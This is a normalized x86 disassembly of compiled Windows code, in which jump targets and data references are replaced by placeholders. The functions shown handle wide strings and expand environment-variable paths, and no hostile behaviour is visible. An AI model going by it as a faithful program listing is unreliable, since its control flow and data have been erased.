push 0xffffffff
push 0x0
push eax
push 0x0
call sub_407280
jmp r-xdata
mov esi [ ebp + 0x8 ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push eax
mov ecx esi
mov [ esi ] 0x0
call sub_4079c0
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
sub_407e00
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
push esi
push 0xffffffff
push 0x0
push eax
mov [ ebp - 0x4 ] 0x0
call sub_4077d0
mov esi [ ebp + 0x8 ]
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
push eax
mov ecx esi
call sub_403a40
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
sub_407e50
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
push esi
push 0xffffffff
push 0x0
push eax
push 0x0
mov [ ebp - 0x4 ] 0x0
call sub_407400
mov esi [ ebp + 0x8 ]
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
push eax
mov ecx esi
call sub_403a40
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
sub_407ea0
push ebp
mov ebp esp
push 0xffffffff
push sub_42d4fb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x9c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ esi + 0x8 ]
xor ebx ebx
xor edi edi
call sub_412e10
test al al
jne r-xdata
mov eax edi
mov ecx [ esi + 0x8 ]
call sub_413450
push 0x1
push r--data
lea ecx [ ebp - 0x48 ]
mov esi eax
mov [ ebp - 0x34 ] 0xf
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] bl
call sub_4076d0
lea eax [ ebp - 0x2c ]
push eax
mov ecx esi
mov [ ebp - 0x4 ] ebx
call sub_407910
lea ecx [ ebp - 0x48 ]
push ecx
push eax
lea edx [ ebp - 0xa8 ]
push edx
mov [ ebp - 0x4 ] 0x1
call sub_407d90
add esp 0xc
push 0xffffffff
push ebx
lea eax [ ebp - 0xa8 ]
push eax
lea ecx [ esi + 0x8 ]
mov [ ebp - 0x4 ] 0x2
call sub_4075e0
mov edi 0x10
cmp [ ebp - 0x94 ] edi
jb r-xdata
mov [ ebp - 0x94 ] 0xf
mov [ ebp - 0x98 ] ebx
mov [ ebp - 0xa8 ] 0x0
cmp [ ebp - 0x18 ] edi
jb r-xdata
mov ecx [ ebp - 0xa8 ]
push ecx
call sub_41a0d6
add esp 0x4
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x34 ] edi
jb r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_41a0d6
add esp 0x4
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx esi
call sub_407910
mov ebx [ esi + 0x4 ]
mov eax [ eax + 0x10 ]
add ebx eax
mov [ ebp - 0x88 ] ebx
cmp [ ebp - 0x18 ] edi
jb r-xdata
mov eax [ ebp - 0x48 ]
push eax
call sub_41a0d6
add esp 0x4
push 0x1
push ebx
call sub_41acef
add esp 0x8
mov [ ebp - 0x84 ] eax
test eax eax
je r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_41a0d6
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_41ac09
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x48 ]
push eax
mov ecx esi
call sub_407910
mov [ ebp - 0x8c ] eax
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x3
call sub_407910
mov edx [ ebp - 0x8c ]
mov ecx [ edx + 0x10 ]
cmp [ eax + 0x14 ] edi
jb r-xdata
push ecx
push eax
mov eax [ ebp - 0x84 ]
push ebx
push eax
call sub_41ad2f
add esp 0x10
cmp [ ebp - 0x18 ] edi
jb r-xdata
mov eax [ eax ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x34 ] edi
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_41a0d6
add esp 0x4
lea eax [ ebp - 0x64 ]
push eax
mov ecx esi
call sub_407910
mov ebx eax
lea ecx [ ebp - 0x80 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x4
call sub_407910
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov ebx [ ebx + 0x10 ]
mov eax [ eax + 0x10 ]
push ecx
push edx
mov edx [ ebp - 0x88 ]
sub edx ebx
mov ebx [ ebp - 0x84 ]
push edx
add eax ebx
push eax
call sub_41ad2f
add esp 0x10
cmp [ ebp - 0x6c ] edi
jb r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_41a0d6
add esp 0x4
mov [ ebp - 0x6c ] 0xf
mov [ ebp - 0x70 ] 0x0
mov [ ebp - 0x80 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x50 ] edi
jb r-xdata
mov eax [ ebp - 0x80 ]
push eax
call sub_41a0d6
add esp 0x4
mov ecx esi
mov [ ebp - 0x50 ] 0xf
mov [ ebp - 0x54 ] 0x0
mov [ ebp - 0x64 ] 0x0
call sub_407580
push esi
call sub_41a0d6
push edi
call sub_41ac18
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebp - 0x64 ]
push ecx
call sub_41a0d6
add esp 0x4
xor eax eax
mov dx [ rw-data ]
mov cl [ rw-data ]
mov [ eax + 0x4 ] dx
mov edx [ ebp - 0x88 ]
mov [ eax + 0x6 ] 0x66
mov [ eax + 0x7 ] cl
mov [ eax + 0x8 ] ebx
mov [ eax + 0xc ] edx
mov [ eax ] 0x0
jmp r-xdata
mov edi eax
sub_408170
push ebp
mov ebp esp
push 0xffffffff
push sub_42d54e
mov eax [ fs : 0x0 ]
push eax
sub esp 0x248
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx [ ebp + 0x8 ]
xor esi esi
mov [ ebp - 0x254 ] esi
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x4 ] esi
cmp eax esi
je r-xdata
push esi
xor eax eax
mov [ ebx + 0x14 ] 0x7
mov [ ebx + 0x10 ] esi
push r--data
mov ecx ebx
mov [ ebx ] ax
call sub_403650
cmp [ ebp + 0x20 ] 0x8
jb r-xdata
push 0x1
push r--data
push eax
push esi
lea ecx [ ebp + 0xc ]
call sub_406a00
test eax eax
je r-xdata
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_41ac09
mov esp ebp
pop ebp
retn 0x20
mov ecx [ ebp + 0xc ]
push ecx
mov esi [ ebp + 0x20 ]
mov edi [ ebp + 0xc ]
mov eax edi
cmp esi 0x8
jae r-xdata
mov edx [ ebp + 0x1c ]
lea ecx [ eax + edx * 2 ]
mov eax edi
cmp esi 0x8
jae r-xdata
lea eax [ ebp + 0xc ]
cmp eax ecx
je r-xdata
lea eax [ ebp + 0xc ]
mov eax edi
cmp esi 0x8
jae r-xdata
cmp [ eax ] 0x2f
jne r-xdata
cmp [ eax + edx * 2 - 0x2 ] 0x5c
jne r-xdata
lea eax [ ebp + 0xc ]
add eax 0x2
cmp eax ecx
jne r-xdata
mov edx 0x5c
mov [ eax ] dx
mov eax edi
cmp esi 0x8
jae r-xdata
push 0x1
dec edx
push edx
lea ecx [ ebp + 0xc ]
call sub_401490
mov esi [ ebp + 0x20 ]
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x20 ]
mov edx [ ebp + 0x1c ]
mov edi [ ebp + 0xc ]
cmp [ eax ] 0x25
lea ecx [ ebp + 0xc ]
jne r-xdata
lea eax [ ebp + 0xc ]
xor eax eax
push ecx
mov [ ebx + 0x14 ] 0x7
mov [ ebx + 0x10 ] 0x0
mov ecx ebx
mov [ ebx ] ax
call sub_403a40
cmp [ ebp + 0x20 ] 0x8
jb r-xdata
push 0x1
push 0xffffffff
lea eax [ ebp - 0x254 ]
push eax
mov [ ebp - 0x254 ] 0x25
call sub_406a90
mov esi eax
lea ecx [ esi - 0x1 ]
push ecx
push 0x1
lea edx [ ebp - 0x250 ]
push edx
lea ecx [ ebp + 0xc ]
call sub_407980
xor edi edi
mov [ ebp - 0x4 ] 0x1
cmp esi edi
jne r-xdata
mov edx [ ebp + 0xc ]
push edx
jmp r-xdata
inc esi
push esi
push edi
lea ecx [ ebp + 0xc ]
call sub_401490
cmp [ ebp + 0x20 ] 0x8
mov eax [ ebp + 0xc ]
mov [ ebp + 0x1c ] edi
jae r-xdata
call sub_41a0d6
add esp 0x4
push 0x104
lea ecx [ ebp - 0x218 ]
push ecx
push eax
call [ GetEnvironmentVariableW@IAT ]
cmp eax edi
jne r-xdata
lea eax [ ebp - 0x250 ]
xor ecx ecx
mov [ eax ] cx
jmp r-xdata
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x218 ]
xor edx edx
push eax
lea ecx [ ebp - 0x234 ]
mov [ ebp - 0x220 ] 0x7
mov [ ebp - 0x224 ] edi
mov [ ebp - 0x234 ] dx
call sub_403650
lea ecx [ ebp + 0xc ]
push ecx
lea edx [ ebp - 0x234 ]
push edx
push ebx
mov [ ebp - 0x4 ] 0x2
call sub_407e00
add esp 0xc
lea ecx [ ebp - 0x234 ]
call sub_401900
jmp r-xdata
push r--data
mov ecx ebx
call sub_403cc0
push 0x206
lea eax [ ebp - 0x216 ]
xor edx edx
push edi
push eax
mov [ ebp - 0x218 ] dx
call sub_41adb0
mov eax [ ebp - 0x250 ]
add esp 0xc
cmp [ ebp - 0x23c ] 0x8
jae r-xdata
lea ecx [ ebp - 0x250 ]
call sub_401900
lea ecx [ ebp + 0xc ]
call sub_401900
jmp r-xdata
sub_4083e0
push ebp
mov ebp esp
push 0xffffffff
push sub_42d588
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x0
call sub_407cd0
mov eax [ esi ]
push eax
call sub_41a0d6
add esp 0x4
mov [ esi ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
sub_408440
push ebp
mov ebp esp
push 0xffffffff
push sub_42d5d6
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov edi [ esi + 0x8 ]
mov [ ebp - 0x4 ] 0x2
test edi edi
je r-xdata
lea edi [ esi + 0x2c ]
mov [ ebp - 0x14 ] edi
mov ecx edi
mov [ ebp - 0x4 ] 0x3
call sub_407cd0
mov eax [ edi ]
push eax
call sub_41a0d6
add esp 0x4
mov [ edi ] 0x0
cmp [ esi + 0x20 ] 0x8
jb r-xdata
mov ecx edi
call sub_4133c0
push edi
call sub_41a0d6
add esp 0x4
mov [ esi + 0x20 ] 0x7
mov [ esi + 0x1c ] 0x0
xor edx edx
mov [ esi + 0xc ] dx
mov [ esi ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ esi + 0xc ]
push ecx
call sub_41a0d6
add esp 0x4
sub_4084f0
push ebp
mov ebp esp
push 0xffffffff
push sub_42e058
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
cmp [ ebp + 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
je r-xdata
mov esi [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0xffffffff
test esi esi
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
add ecx 0x2c
call sub_407be0
mov esi [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0xffffffff
test esi esi
je r-xdata
xor al al
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x8
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x8
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
sub_4085f0
push ebp
mov ebp esp
push 0xffffffff
push sub_42d629
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x14 ] edi
xor eax eax
mov [ edi + 0x4 ] ax
xor ebx ebx
mov [ edi ] r--data
xor ecx ecx
mov [ edi + 0x20 ] 0x7
mov [ edi + 0x1c ] ebx
mov [ ebp - 0x4 ] ebx
mov [ edi + 0xc ] cx
lea esi [ edi + 0x2c ]
push 0x8
mov [ ebp - 0x4 ] 0x1
mov [ esi ] ebx
call sub_41ac18
add esp 0x4
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x10 ] ebx
call sub_419f97
push r--data
lea ecx [ ebp - 0x20 ]
push ecx
mov [ ebp - 0x20 ] r--data
call sub_41ac98
int3
mov [ esi ] eax
xor edx edx
mov [ eax + 0x4 ] edx
xor ecx ecx
mov [ eax ] ecx
mov edx [ esi ]
mov [ edx ] esi
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] ebx
mov eax [ rw-data ]
push 0x58
mov [ ebp - 0x4 ] 0x2
mov [ edi + 0x28 ] eax
call sub_41ac18
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x3
cmp eax ebx
je r-xdata
xor eax eax
mov ecx [ rw-data ]
push ecx
mov ecx eax
call sub_4135f0
jmp r-xdata
mov dx [ rw-data ]
mov [ edi + 0x8 ] eax
mov [ edi + 0x4 ] dx
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4086f0
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_408440
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_41a0d6
add esp 0x4
sub_408720
push ebp
mov ebp esp
push 0xffffffff
push sub_42d392
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov ecx [ edi + 0x4 ]
mov esi [ ebp + 0x8 ]
cmp esi ecx
jae r-xdata
cmp ecx [ edi + 0x8 ]
jne r-xdata
mov eax [ edi ]
cmp eax esi
ja r-xdata
mov ecx [ edi + 0x4 ]
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x10 ] ecx
xor edx edx
mov [ ebp - 0x4 ] 0x1
cmp ecx edx
je r-xdata
push 0x1
mov ecx edi
call sub_4051a0
sub esi eax
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
cmp ecx [ edi + 0x8 ]
jne r-xdata
add [ edi + 0x4 ] 0x1c
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] edx
mov [ ecx ] ax
push esi
mov ecx [ edi ]
lea eax [ esi * 8 ]
sub eax esi
lea eax [ ecx + eax * 4 ]
mov ecx [ edi + 0x4 ]
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x10 ] ecx
xor edx edx
mov [ ebp - 0x4 ] edx
cmp ecx edx
je r-xdata
push 0x1
mov ecx edi
call sub_4051a0
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] edx
mov [ ecx ] dx
push eax
jmp r-xdata
call sub_403a40
sub_408800
push ebp
mov ebp esp
push 0xffffffff
push sub_42d679
mov eax [ fs : 0x0 ]
push eax
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
xor esi esi
mov [ ebp - 0x3c ] esi
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] edi
mov [ eax ] esi
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] esi
xor ebx ebx
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x3c ] 0x1
mov [ ebp - 0x30 ] ebx
cmp [ ebp + 0x10 ] esi
jbe r-xdata
lea eax [ esi + 0x2 ]
push 0x2
push eax
mov [ ebp - 0x34 ] eax
call sub_41acef
mov ecx [ ebp - 0x34 ]
push esi
sub edi esi
add edi ebx
push edi
lea edx [ ecx + ecx ]
push edx
push eax
mov [ ebp - 0x30 ] eax
call sub_41ad2f
mov esi [ ebp - 0x30 ]
add esp 0x18
xor eax eax
mov [ ebp - 0x2c ] ax
mov eax esi
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] 0x0
lea edx [ eax + 0x2 ]
lea esp [ esp ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push esi
lea ecx [ ebp - 0x2c ]
call sub_403650
mov edi [ ebp - 0x38 ]
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx edi
mov [ ebp - 0x4 ] 0x2
call sub_408720
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
inc ebx
inc esi
mov [ ebp - 0x30 ] ebx
cmp ebx [ ebp + 0x10 ]
jb r-xdata
lea ebx [ esi + 0x2 ]
push 0x2
push ebx
call sub_41acef
mov edx [ ebp - 0x34 ]
sub edx esi
add edx [ ebp - 0x30 ]
push esi
mov edi eax
push edx
lea eax [ ebx + ebx ]
push eax
push edi
call sub_41ad2f
xor esi esi
add esp 0x18
xor ecx ecx
mov eax edi
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x2c ] cx
lea edx [ eax + 0x2 ]
mov edi edi
push esi
call sub_41a7eb
add esp 0x4
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_41ac09
mov esp ebp
pop ebp
retn 0xc
mov edx [ ebp - 0x2c ]
push edx
call sub_41a0d6
add esp 0x4
movzx eax [ edi + ebx ]
movsx ecx [ rw-data ]
cmp eax ecx
jne r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push edi
lea ecx [ ebp - 0x2c ]
call sub_403650
mov ecx [ ebp - 0x38 ]
lea edx [ ebp - 0x2c ]
mov ebx 0x1
push edx
mov [ ebp - 0x4 ] ebx
call sub_408720
cmp [ ebp - 0x18 ] 0x8
mov [ ebp - 0x4 ] 0x0
jb r-xdata
add [ ebp - 0x30 ] ebx
push edi
call sub_41a7eb
mov ebx [ ebp - 0x30 ]
mov edi [ ebp - 0x34 ]
add esp 0x4
mov eax [ ebp - 0x2c ]
push eax
call sub_41a0d6
add esp 0x4
sub_4089c0
push ebp
mov ebp esp
push 0xffffffff
push sub_42d85b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x448
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
push 0x18
mov esi ecx
mov [ ebp - 0x434 ] eax
call sub_41ac18
add esp 0x4
mov [ ebp - 0x430 ] eax
xor edi edi
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
push 0xb
push rw-data
mov ecx edi
mov [ ebp - 0x4 ] 0xffffffff
call sub_4124b0
movzx eax [ ebp + 0x8 ]
add eax 0xffffff9b
cmp eax 0x4
ja r-xdata
mov ecx eax
call sub_412420
mov edi eax
push 0x64
push rw-data
mov ecx edi
call sub_412490
sub esp 0x1c
mov edx esp
mov [ ebp - 0x430 ] esp
push edx
mov ecx edi
call sub_412790
mov ecx esi
call sub_407b20
test edi edi
je r-xdata
jmp [ eax * 4 + jump_table_4096f4 ]
xor al al
mov ecx edi
call sub_412460
push edi
call sub_41a0d6
add esp 0x4
mov ecx [ ebp - 0x434 ]
push ebx
push ecx
lea edx [ ebp - 0x444 ]
push edx
mov ecx esi
call sub_408800
mov ebx [ ebp - 0x444 ]
mov eax [ ebp - 0x440 ]
mov [ ebp - 0x4 ] 0x1
cmp ebx eax
jne r-xdata
mov ecx [ ebp - 0x434 ]
push ebx
push ecx
lea edx [ ebp - 0x444 ]
push edx
mov ecx esi
call sub_408800
mov ecx [ ebp - 0x444 ]
mov eax [ ebp - 0x440 ]
mov [ ebp - 0x4 ] 0x8
cmp ecx eax
jne r-xdata
mov eax [ ebp - 0x434 ]
push ebx
push eax
lea ecx [ ebp - 0x444 ]
push ecx
mov ecx esi
call sub_408800
mov eax [ ebp - 0x440 ]
mov ecx [ ebp - 0x444 ]
mov [ ebp - 0x4 ] 0xf
cmp ecx eax
jne r-xdata
mov eax [ ebp - 0x434 ]
push ebx
push eax
lea ecx [ ebp - 0x444 ]
push ecx
mov ecx esi
call sub_408800
mov ebx [ ebp - 0x444 ]
mov eax [ ebp - 0x440 ]
mov [ ebp - 0x4 ] 0x1a
cmp ebx eax
jne r-xdata
mov ecx [ ebp - 0x434 ]
push ebx
push ecx
lea edx [ ebp - 0x454 ]
push edx
mov ecx esi
call sub_408800
mov ebx [ ebp - 0x454 ]
mov eax [ ebp - 0x450 ]
mov [ ebp - 0x4 ] 0x21
cmp ebx eax
je r-xdata
sub eax ebx
mov ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x3
je r-xdata
lea ecx [ ebp - 0x444 ]
jmp r-xdata
sub eax ecx
mov ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x3
je r-xdata
lea ecx [ ebp - 0x444 ]
jmp r-xdata
sub eax ecx
mov ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x3
jae r-xdata
lea ecx [ ebp - 0x444 ]
jmp r-xdata
sub eax ebx
mov ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x3
je r-xdata
lea ecx [ ebp - 0x444 ]
jmp r-xdata
lea ecx [ ebp - 0x454 ]
sub eax ebx
mov ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x4
ja r-xdata
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x430 ] esp
push ebx
call sub_402060
lea ecx [ ebp - 0x234 ]
push ecx
mov ecx esi
call sub_408170
cmp [ ebp - 0x224 ] 0x0
mov [ ebp - 0x4 ] 0x2
jne r-xdata
lea ecx [ ebp - 0x444 ]
call sub_404be0
lea ecx [ ebp - 0x444 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
call sub_402660
push 0x78
push rw-data
mov ecx edi
call sub_412490
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x430 ] esp
push ecx
mov ecx edi
call sub_412790
mov ecx esi
call sub_407b20
push 0x10
push rw-data
mov ecx edi
call sub_412490
mov edx [ ebp - 0x444 ]
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x430 ] esp
push edx
call sub_402060
lea eax [ ebp - 0x234 ]
push eax
mov ecx esi
call sub_408170
cmp [ ebp - 0x224 ] 0x0
mov [ ebp - 0x4 ] 0x9
jne r-xdata
lea ecx [ ebp - 0x444 ]
call sub_404be0
lea ecx [ ebp - 0x444 ]
jmp r-xdata
mov edx [ ebp - 0x444 ]
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x430 ] esp
push edx
call sub_402060
lea eax [ ebp - 0x250 ]
push eax
mov ecx esi
call sub_408170
cmp [ ebp - 0x240 ] 0x0
mov [ ebp - 0x4 ] 0x10
jne r-xdata
lea ecx [ ebp - 0x444 ]
call sub_404be0
lea ecx [ ebp - 0x444 ]
jmp r-xdata
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x430 ] esp
push ebx
call sub_402060
lea ecx [ ebp - 0x234 ]
push ecx
mov ecx esi
call sub_408170
cmp [ ebp - 0x224 ] 0x0
mov [ ebp - 0x4 ] 0x1b
jne r-xdata
lea ecx [ ebp - 0x444 ]
call sub_404be0
lea ecx [ ebp - 0x444 ]
jmp r-xdata
mov al 0x1
jmp r-xdata
mov ecx edi
call sub_412460
push edi
call sub_41a0d6
add esp 0x4
lea ecx [ ebp - 0x454 ]
call sub_404be0
cmp eax 0x3
jb r-xdata
push 0x10
push rw-data
mov ecx edi
call sub_412490
lea edx [ ebp - 0x250 ]
push edx
mov ecx edi
call sub_412790
mov eax [ ebp - 0x444 ]
mov ecx [ rw-data ]
add eax 0x38
push ecx
push eax
mov [ ebp - 0x4 ] 0x3
call sub_406dc0
add esp 0x8
test al al
mov eax [ ebp - 0x444 ]
push 0x0
je r-xdata
lea ecx [ ebp - 0x234 ]
call sub_401900
lea ecx [ ebp - 0x444 ]
jmp r-xdata
lea ecx [ ebp - 0x250 ]
push ecx
mov ecx edi
call sub_412790
mov eax [ ebp - 0x444 ]
mov edx [ rw-data ]
add eax 0x38
push edx
mov bl 0xa
push eax
mov [ ebp - 0x4 ] bl
call sub_406dc0
add esp 0x8
test al al
mov eax [ ebp - 0x444 ]
push 0x1
je r-xdata
lea ecx [ ebp - 0x234 ]
call sub_401900
lea ecx [ ebp - 0x444 ]
jmp r-xdata
push r--data
lea ecx [ ebp - 0x314 ]
call sub_403cc0
push eax
lea ecx [ ebp - 0x250 ]
push ecx
lea edx [ ebp - 0x330 ]
push edx
mov [ ebp - 0x4 ] 0x11
call sub_407e50
mov ecx [ ebp - 0x444 ]
add ecx 0x1c
push ecx
push eax
lea eax [ ebp - 0x234 ]
push eax
mov [ ebp - 0x4 ] 0x12
call sub_407e00
add esp 0x18
lea ecx [ ebp - 0x330 ]
call sub_401900
lea ecx [ ebp - 0x314 ]
mov [ ebp - 0x4 ] 0x15
call sub_401900
mov eax [ ebp - 0x224 ]
add eax eax
sub ebx eax
add eax [ ebp - 0x434 ]
push ebx
push eax
sub esp 0x1c
lea edx [ ebp - 0x234 ]
mov ecx esp
mov [ ebp - 0x430 ] esp
push edx
call sub_402060
mov ecx [ esi + 0x8 ]
call sub_412e60
mov ecx [ esi + 0x8 ]
mov bl al
lea eax [ ebp - 0x2a4 ]
push eax
call sub_413cf0
push 0x8a
push rw-data
mov ecx edi
mov [ ebp - 0x4 ] 0x16
call sub_412490
lea ecx [ ebp - 0x2dc ]
push ecx
mov ecx edi
call sub_412790
push 0xa2
push rw-data
mov ecx edi
mov [ ebp - 0x4 ] 0x17
call sub_412490
lea edx [ ebp - 0x2c0 ]
push edx
mov ecx edi
call sub_412790
xor eax eax
push 0x206
push eax
lea ecx [ ebp - 0x216 ]
push ecx
mov [ ebp - 0x4 ] 0x18
mov [ ebp - 0x218 ] ax
call sub_41adb0
add esp 0xc
lea eax [ ebp - 0x2dc ]
test bl 0x1
jne r-xdata
lea ecx [ ebp - 0x250 ]
call sub_401900
lea ecx [ ebp - 0x444 ]
jmp r-xdata
push 0x10
push rw-data
mov ecx edi
call sub_412490
lea edx [ ebp - 0x250 ]
push edx
mov ecx edi
call sub_412790
mov eax [ ebp - 0x444 ]
mov ecx [ rw-data ]
add eax 0x38
push ecx
mov bl 0x1c
push eax
mov [ ebp - 0x4 ] bl
call sub_406dc0
add esp 0x8
test al al
